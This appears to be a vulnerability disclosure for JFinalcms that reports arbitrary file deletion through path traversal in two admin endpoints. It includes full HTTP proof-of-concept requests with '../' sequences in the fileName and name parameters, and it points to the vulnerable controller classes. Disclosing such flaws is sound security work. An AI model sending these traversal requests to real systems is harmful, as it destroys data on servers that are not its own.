Any file deletion vulnerability

Project Address
https://gitee.com/heyewei/JFinalcms


Project Issues
https://gitee.com/heyewei/JFinalcms/issues/IAOSJG  


https://gitee.com/yuhuanyu/cve/blob/master/README.en.md

Num.1


POST /admin/template/delete?fileName=../../../../../secTest/1.txt&directory=../ HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: http://localhost:8888
Connection: close
Referer: http://localhost:8888/admin/content
Cookie: JSESSIONID=node036kne8kfiwz0ep1x1h0sd5o50.node0; listQuery=categoryId%3D
Priority: u=0

New built 1.txt

<img width="772" alt="image" src="https://github.com/user-attachments/assets/a4b47d8f-d4d5-4506-833e-385c4a38d783">

Make a request

<img width="772" alt="image" src="https://github.com/user-attachments/assets/77c8e80e-9d09-459c-b5bb-1d153de3a404">

1.txt already deleted

<img width="783" alt="image" src="https://github.com/user-attachments/assets/ab51ac5a-ef0c-4408-a6e3-bb70559337e1">

code analysis
om.cms.controller.admin.TemplateController

<img width="771" alt="image" src="https://github.com/user-attachments/assets/6b460123-7d9b-422e-a15a-ca3bab100bc7">





Num.2


GET /admin/database/delete?name=../../../../../../../secTest/4.txt HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=node07xt45l5ni0kg1knd85k9f4gs50.node0; listQuery=directory%3Ddefault
Priority: u=4

New built 1.txt 2.txt 3.txt and 4.txt

<img width="775" alt="image" src="https://github.com/user-attachments/assets/9e68e05a-01cf-4396-b6ad-42f60c957a28">

Make a quest for 4.txt

<img width="774" alt="image" src="https://github.com/user-attachments/assets/50f3d051-4852-4b3b-92cf-760ff460182d">

4.txt already deleted

<img width="771" alt="image" src="https://github.com/user-attachments/assets/47e2f4fd-4408-4324-8617-43f6db7381d6">


code analysis

com.cms.controller.admin.DatabaseController

<img width="650" alt="image" src="https://github.com/user-attachments/assets/b2f63e55-ed91-4d48-ac2d-bd0653ef2261">

com.cms.util.BackupUtils

<img width="780" alt="image" src="https://github.com/user-attachments/assets/d41a07b8-b71e-429e-b23a-579a69323122">











